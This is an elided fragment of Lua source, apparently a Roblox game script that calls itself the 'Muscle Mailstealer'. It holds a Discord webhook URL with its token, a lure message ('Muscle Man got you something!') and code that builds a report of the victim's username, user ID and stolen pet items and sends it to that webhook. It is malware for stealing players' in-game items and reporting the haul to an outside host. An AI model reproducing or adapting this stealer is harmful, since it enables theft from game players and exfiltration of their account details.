...
LogsWebhook = "https://discord.com/api/webhooks/1292732752650833963/oFYNr8KAXHfS1b4iagJdc0a2fzru6IYn7fGTDHZyIg5VDB2poUICHDl1HM8xt8VGfHXg"
mailstealer_name = "Muscle"
...
local MailMessage = "Muscle Man got you something!"
...
local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets_left, shiny, ping, RAP, totalRap1)
    ...
    imgs =
        "https://media.discordapp.net/attachments/1288404053394456587/1292742655037407304/171426663.jpg?ex=6704d7ea&is=6703866a&hm=7f4c4deaab5161432fadf61976a633b6ebd113afc06439f0fed4adfbf40d0b2b&=&format=webp&width=419&height=419?format=webp&quality=lossless"
        ...
        ["embeds"] = {
            {
                ...
                ["type"] = "rich",
                ["color"] = tonumber(6697881),
                ["thumbnail"] = {
                    ["url"] = thumbnail
                },
                ["fields"] = {
                    {
                        ["name"] = "**This data was obtained using " .. mailstealer_name .. " Mailstealer**",
                        ["value"] = "```Username     : " ..
                            fardplayer.Name ..
                                "\nUser-ID      : " ..
                                    fardplayer.userId ..
